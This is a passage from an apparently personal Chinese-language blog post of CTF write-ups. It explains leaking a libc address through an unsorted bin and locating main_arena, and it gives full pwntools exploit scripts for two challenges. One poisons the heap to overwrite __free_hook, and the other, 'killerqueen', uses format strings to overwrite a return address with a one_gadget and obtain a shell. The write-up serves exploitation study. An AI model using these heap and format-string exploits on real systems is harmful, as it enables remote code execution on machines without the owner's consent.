</span></span></code></pre></div><p>这里面的 <code>bins</code> 数组就保存了 <code>Unsorted Bin</code> 的头节点，由于 <code>Unsorted Bin</code> 用（循环）双向链表维护，那么链表中尾节点的 <code>fd</code> 就会指向头节点，也就是结构体的固定偏移处了（事实上 <code>bins[0]</code> 和 <code>bins[1]</code> 就是<code>Unsorted Bin</code>的头节点），本题我们只往<code>Unsorted Bin</code>中放一个<code>bin</code>，所以第这个 <code>bin</code> 就是尾节点了。事实上还是有必要多啰嗦几句，<code>fd</code> 指向下一个节点，<code>bk</code>指向前一个节点，如果<code>Unsorted Bin</code>链表中不止一个<code>bin</code>的话第一个<code>bin</code>的<code>fd</code>是不会像本题一样指向<code>main_arena</code>的，但是<code>bk</code>仍然可以 leak，在 64 位机下由于地址高2字节为<code>\x00</code>的原因往往难以 leak 出<code>bk</code>，但是 32 位机下往往是可以的。也就是说一些情况下不一定需要 leak 链表尾，头也是可以的。</p><p>附一张调试图</p><div style=text-align:center><img src=https://chujdk.github.io/usr/uploads/2021/02/3076927169.png></div><p>这样应该就很清楚了</p><h5 id=如何获得-main_arena-的偏移>如何获得 <code>main_arena</code> 的偏移</h5><p>固定偏移具体是多少可以很容易地通过调试得出，也可以自己算，而 <code>main_arena</code> 相对于基地址的偏移稍微麻烦一点。把题目提供的 libc 放到 IDA 里面，找到 <code>malloc_trim()</code> 函数</p><div style=text-align:center><img src=https://chujdk.github.io/usr/uploads/2021/02/2603976079.png></div><p><code>dword_3EBC40</code> 就是 <code>main_arena</code> 了。当然这样说他是就是显得很不负责任，凭啥说他是呢？还是要看一下 <code>malloc.c</code> 中的源码</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#902000>int</span>
</span></span><span style=display:flex><span><span style=color:#06287e>__malloc_trim</span> (size_t s)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#902000>int</span> result <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> (__malloc_initialized <span style=color:#666>&lt;</span> <span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>    ptmalloc_init ();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  mstate ar_ptr <span style=color:#666>=</span> <span style=color:#666>&amp;</span>main_arena;<span style=color:#60a0b0;font-style:italic>//&lt;=here!
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#007020;font-weight:700>do</span>
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      __libc_lock_lock (ar_ptr<span style=color:#666>-&gt;</span>mutex);
</span></span><span style=display:flex><span>      result <span style=color:#666>|=</span> mtrim (ar_ptr, s);
</span></span><span style=display:flex><span>      __libc_lock_unlock (ar_ptr<span style=color:#666>-&gt;</span>mutex);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>      ar_ptr <span style=color:#666>=</span> ar_ptr<span style=color:#666>-&gt;</span>next;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>while</span> (ar_ptr <span style=color:#666>!=</span> <span style=color:#666>&amp;</span>main_arena);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>return</span> result;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>两个对照一下就明白了。按说 <code>main_arena</code> 在很多函数里面肯定都出现了，为什么独独找这个函数呢？我也不知道。大家都用这个找就这个吧。</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python</span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding=utf-8</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>pwn</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#sh = process(&#34;./note&#34;)</span>
</span></span><span style=display:flex><span>sh <span style=color:#666>=</span> remote(<span style=color:#4070a0>&#34;159.75.104.107&#34;</span>,<span style=color:#40a070>30369</span>)
</span></span><span style=display:flex><span>libc <span style=color:#666>=</span> ELF(<span style=color:#4070a0>&#34;./libc-2.27.so&#34;</span>) 
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>take</span>(size):
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;exit</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#4070a0>&#39;1&#39;</span>)
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;write?</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#007020>str</span>(size))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>delete</span>(index):
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;exit</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#4070a0>&#39;2&#39;</span>)
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;delete?</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#007020>str</span>(index))
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>edit</span>(payload,index):
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;exit</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#4070a0>&#39;3&#39;</span>)
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;edit?</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#007020>str</span>(index))
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>send(payload)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>show</span>(index):
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;exit</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#4070a0>&#39;4&#39;</span>)
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;show?</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#007020>str</span>(index))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>take(<span style=color:#40a070>2048</span>)<span style=color:#60a0b0;font-style:italic>#index:0</span>
</span></span><span style=display:flex><span>take(<span style=color:#40a070>0x100</span>)<span style=color:#60a0b0;font-style:italic>#index:1</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>delete(<span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>show(<span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>libc_base <span style=color:#666>=</span> u64(sh<span style=color:#666>.</span>recv(<span style=color:#40a070>6</span>)<span style=color:#666>.</span>ljust(<span style=color:#40a070>8</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>)) <span style=color:#666>-</span> <span style=color:#40a070>0x3ebc40</span> <span style=color:#666>-</span> <span style=color:#40a070>96</span>
</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;libc_base:&#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(libc_base))
</span></span><span style=display:flex><span>delete(<span style=color:#40a070>1</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#malloc_hook = libc_base + libc.symbols[&#34;__malloc_hook&#34;]</span>
</span></span><span style=display:flex><span>free_hook <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>symbols[<span style=color:#4070a0>&#34;__free_hook&#34;</span>]
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#log.success(&#34;malloc_hook:&#34; + hex(malloc_hook)) </span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#edit(p64(malloc_hook - 0x10),1)</span>
</span></span><span style=display:flex><span>edit(p64(free_hook),<span style=color:#40a070>1</span>)
</span></span><span style=display:flex><span>take(<span style=color:#40a070>0x100</span>)<span style=color:#60a0b0;font-style:italic>#index:2</span>
</span></span><span style=display:flex><span>take(<span style=color:#40a070>0x100</span>)<span style=color:#60a0b0;font-style:italic>#index:3</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>one_gadget <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0x4f432</span>
</span></span><span style=display:flex><span>realloc <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>symbols[<span style=color:#4070a0>&#34;__libc_realloc&#34;</span>]
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#payload = p64(one_gadget) + p64(realloc + 0xa)</span>
</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> p64(one_gadget)
</span></span><span style=display:flex><span>edit(payload,<span style=color:#40a070>3</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#take(0x200)</span>
</span></span><span style=display:flex><span>delete(<span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>interactive()
</span></span></code></pre></div><p>写 <code>malloc_hook</code> 的时候发现 <code>one_gadget</code> 都不能用，就改成 <code>free_hook</code> 了。</p><h3 id=killerqueen>killerqueen</h3><p>逻辑挺简单的，有两次格式化字符串攻击的机会，我选择第一次 leak，第二次改返回地址为 <code>one_gadget</code> getshell。其实刚开始的时候我是考虑通过格式占位符 <code>%200000c</code> 让 <code>printf</code> 输出大量字符，这样他就会调用 <code>malloc()</code>，那么就只有修改 <code>__malloc_hook</code> 或 <code>__free_hook</code> 为 <code>one_gadget</code> 就可以 <code>getshell</code> 了。但是由于 <code>one_gadget</code> 的限制不可行，就只好改返回地址了。</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python</span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding=utf-8</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>pwn</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>LibcSearcher</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#context(log_level = &#39;debug&#39;,os = &#39;linux&#39;,arch = &#39;amd64&#39;)</span>
</span></span><span style=display:flex><span>context<span style=color:#666>.</span>terminal <span style=color:#666>=</span> [<span style=color:#4070a0>&#39;tmux&#39;</span>,<span style=color:#4070a0>&#39;splitw&#39;</span>,<span style=color:#4070a0>&#39;-h&#39;</span>]
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#40a070>0x70</span>,<span style=color:#40a070>0x79</span>):<span style=color:#60a0b0;font-style:italic>#0x10a41c -&gt; i==0x70;0x4f432 -&gt; i==0x48</span>
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>try</span>:
</span></span><span style=display:flex><span>        <span style=color:#60a0b0;font-style:italic>#sh = process(&#39;./kq&#39;)</span>
</span></span><span style=display:flex><span>        sh <span style=color:#666>=</span> remote(<span style=color:#4070a0>&#34;159.75.104.107&#34;</span>,<span style=color:#40a070>30339</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;电话</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#4070a0>&#39;0&#39;</span>)
</span></span><span style=display:flex><span>        rand <span style=color:#666>=</span> <span style=color:#007020>int</span>(sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;:&#34;</span>,drop <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>True</span>),base <span style=color:#666>=</span> <span style=color:#40a070>10</span>)
</span></span><span style=display:flex><span>        sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;什么</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#4070a0>&#39;a&#39;</span>)
</span></span><span style=display:flex><span>        sh<span style=color:#666>.</span>send(<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#007020>str</span>(<span style=color:#666>-</span>rand <span style=color:#666>-</span> <span style=color:#40a070>2</span>))
</span></span><span style=display:flex><span>        payload <span style=color:#666>=</span> <span style=color:#4070a0>&#39;%19$p-%17$p-%24$p-%44$p&#39;</span>
</span></span><span style=display:flex><span>        sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;是——</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,payload)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#39;...</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
</span></span><span style=display:flex><span>        _IO_2_1_stdout_addr <span style=color:#666>=</span> <span style=color:#007020>int</span>(sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;-&#34;</span>,drop <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>True</span>),base <span style=color:#666>=</span> <span style=color:#40a070>16</span>)
</span></span><span style=display:flex><span>        _IO_file_write_addr <span style=color:#666>=</span> <span style=color:#007020>int</span>(sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;-&#34;</span>,drop <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>True</span>),base <span style=color:#666>=</span> <span style=color:#40a070>16</span>) <span style=color:#666>-</span> <span style=color:#40a070>45</span>
</span></span><span style=display:flex><span>        prog_base <span style=color:#666>=</span> <span style=color:#007020>int</span>(sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;-&#34;</span>,drop <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>True</span>),base <span style=color:#666>=</span> <span style=color:#40a070>16</span>) <span style=color:#666>-</span> <span style=color:#40a070>0x10b8</span>
</span></span><span style=display:flex><span>        stack_addr <span style=color:#666>=</span> <span style=color:#007020>int</span>(sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,drop <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>True</span>),base <span style=color:#666>=</span> <span style=color:#40a070>16</span>)
</span></span><span style=display:flex><span>        ret_addr <span style=color:#666>=</span> stack_addr <span style=color:#666>-</span> <span style=color:#40a070>0x28</span> <span style=color:#666>-</span> <span style=color:#40a070>0xE0</span> 
</span></span><span style=display:flex><span>        log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#39;_IO_2_1_stdout_:&#39;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(_IO_2_1_stdout_addr))
</span></span><span style=display:flex><span>        log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#39;ret_addr:&#39;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(ret_addr))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        libc <span style=color:#666>=</span> LibcSearcher(<span style=color:#4070a0>&#34;_IO_2_1_stdout_&#34;</span>,_IO_2_1_stdout_addr)
</span></span><span style=display:flex><span>        libc<span style=color:#666>.</span>add_condition(<span style=color:#4070a0>&#34;_IO_file_write&#34;</span>,_IO_file_write_addr)
</span></span><span style=display:flex><span>        libc_base <span style=color:#666>=</span> _IO_2_1_stdout_addr <span style=color:#666>-</span> libc<span style=color:#666>.</span>dump(<span style=color:#4070a0>&#34;_IO_2_1_stdout_&#34;</span>)
</span></span><span style=display:flex><span>        log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#39;libc_base:&#39;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(libc_base))
</span></span><span style=display:flex><span>        log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#39;_IO_file_write_addr:&#39;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(_IO_file_write_addr))
</span></span><span style=display:flex><span>        log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#39;_IO_file_write_addr_calc:&#39;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>dump(<span style=color:#4070a0>&#39;_IO_file_write&#39;</span>)))
</span></span><span style=display:flex><span>        malloc_hook <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>dump(<span style=color:#4070a0>&#34;__malloc_hook&#34;</span>)
</span></span><span style=display:flex><span>        one_gadget <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0x10a41c</span>
</span></span><span style=display:flex><span>        <span style=color:#60a0b0;font-style:italic>#one_gadget = prog_base + 0x910</span>
</span></span><span style=display:flex><span>        log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#39;one:&#39;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(one_gadget))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#60a0b0;font-style:italic>#payload = fmtstr_payload(6,{malloc_hook:one_gadget},numbwritten = 0,write_size = &#39;short&#39;)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        target_info <span style=color:#666>=</span> [[one_gadget <span style=color:#666>&amp;</span> <span style=color:#40a070>0xFFFF</span>,<span style=color:#40a070>0</span>],[(one_gadget <span style=color:#666>&gt;&gt;</span> <span style=color:#40a070>16</span>) <span style=color:#666>&amp;</span> <span style=color:#40a070>0xFFFF</span>,<span style=color:#40a070>2</span>],[(one_gadget <span style=color:#666>&gt;&gt;</span> <span style=color:#40a070>32</span>) <span style=color:#666>&amp;</span> <span style=color:#40a070>0xFFFF</span>,<span style=color:#40a070>4</span>]]
</span></span><span style=display:flex><span>        target_info <span style=color:#666>=</span> <span style=color:#007020>sorted</span>(target_info,key <span style=color:#666>=</span> (<span style=color:#007020;font-weight:700>lambda</span> x:x[<span style=color:#40a070>0</span>]))
</span></span><span style=display:flex><span>        <span style=color:#007020>print</span> target_info
</span></span><span style=display:flex><span>        payload <span style=color:#666>=</span> <span style=color:#4070a0>&#39;%15$lln&#39;</span> 
</span></span><span style=display:flex><span>        payload <span style=color:#666>+=</span> <span style=color:#4070a0>&#39;%&#39;</span> <span style=color:#666>+</span> <span style=color:#007020>str</span>(target_info[<span style=color:#40a070>0</span>][<span style=color:#40a070>0</span>]) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;c&#39;</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;%12$hn&#39;</span>
</span></span><span style=display:flex><span>        payload <span style=color:#666>+=</span> <span style=color:#4070a0>&#39;%&#39;</span> <span style=color:#666>+</span> <span style=color:#007020>str</span>(target_info[<span style=color:#40a070>1</span>][<span style=color:#40a070>0</span>] <span style=color:#666>-</span> target_info[<span style=color:#40a070>0</span>][<span style=color:#40a070>0</span>]) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;c&#39;</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;%13$hn&#39;</span>
</span></span><span style=display:flex><span>        payload <span style=color:#666>+=</span> <span style=color:#4070a0>&#39;%&#39;</span> <span style=color:#666>+</span> <span style=color:#007020>str</span>(target_info[<span style=color:#40a070>2</span>][<span style=color:#40a070>0</span>] <span style=color:#666>-</span> target_info[<span style=color:#40a070>1</span>][<span style=color:#40a070>0</span>]) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;c&#39;</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;%14$hn&#39;</span>
</span></span><span style=display:flex><span>        payload <span style=color:#666>=</span> payload<span style=color:#666>.</span>ljust(<span style=color:#40a070>48</span>,<span style=color:#4070a0>&#39;a&#39;</span>)
</span></span><span style=display:flex><span>        payload <span style=color:#666>+=</span> p64(ret_addr <span style=color:#666>+</span> target_info[<span style=color:#40a070>0</span>][<span style=color:#40a070>1</span>])
</span></span><span style=display:flex><span>        payload <span style=color:#666>+=</span> p64(ret_addr <span style=color:#666>+</span> target_info[<span style=color:#40a070>1</span>][<span style=color:#40a070>1</span>])
</span></span><span style=display:flex><span>        payload <span style=color:#666>+=</span> p64(ret_addr <span style=color:#666>+</span> target_info[<span style=color:#40a070>2</span>][<span style=color:#40a070>1</span>])
</span></span><span style=display:flex><span>        payload <span style=color:#666>+=</span> p64(ret_addr <span style=color:#666>+</span> i)
</span></span><span style=display:flex><span>        payload <span style=color:#666>=</span> payload<span style=color:#666>.</span>ljust(<span style=color:#40a070>0x100</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#007020>print</span> payload
</span></span><span style=display:flex><span>        <span style=color:#60a0b0;font-style:italic>#payload += &#39;%150000cok&#39;</span>
</span></span><span style=display:flex><span>        sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;什么</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,payload)
</span></span><span style=display:flex><span>        sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;a&#34;</span>)
</span></span><span style=display:flex><span>        log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#39;one:&#39;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(one_gadget))
</span></span><span style=display:flex><span>        <span style=color:#60a0b0;font-style:italic>#gdb.attach(proc.pidof(sh)[0])</span>
</span></span><span style=display:flex><span>        sh<span style=color:#666>.</span>sendline(<span style=color:#4070a0>&#34;&#34;</span>)
</span></span><span style=display:flex><span>        sh<span style=color:#666>.</span>sendline(<span style=color:#4070a0>&#34;echo &#39;pwned&#39;&#34;</span>)
</span></span><span style=display:flex><span>        sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;pwned&#34;</span>)
</span></span><span style=display:flex><span>        sh<span style=color:#666>.</span>interactive()
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>break</span>
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>except</span>:
</span></span><span style=display:flex><span>        sh<span style=color:#666>.</span>close()
</span></span></code></pre></div><p>麻烦还是有点麻烦的，调了不少时间。</p></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/write-up>write-up</a></li><li><a href=/tags/hctf-game>hctf-game</a></li></ul></nav></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/chujDK rel=me title=GitHub><i data-feather=github></i></a>
<a class=border></a><a class=soc href=https://twitter.com/chujdk rel=me title=Twitter><i data-feather=twitter></i></a>
<a class=border></a><a class=soc href=mailto:chujj31@gmail.com rel=me title=Mail><i data-feather=mail></i></a>
<a class=border></a><a class=soc href=https://chujdk.github.io/index.xml rel=me title=Rss><i data-feather=rss></i></a>
<a class=border></a></div><div class=footer-info>2025 © chuj | Based on <a href=https://github.com/athul/archie>Archie</a> | Built with <a href=https://gohugo.io>Hugo</a> | <a href=#>Goto Top</a></div></footer><script>feather.replace()</script></div></body></html>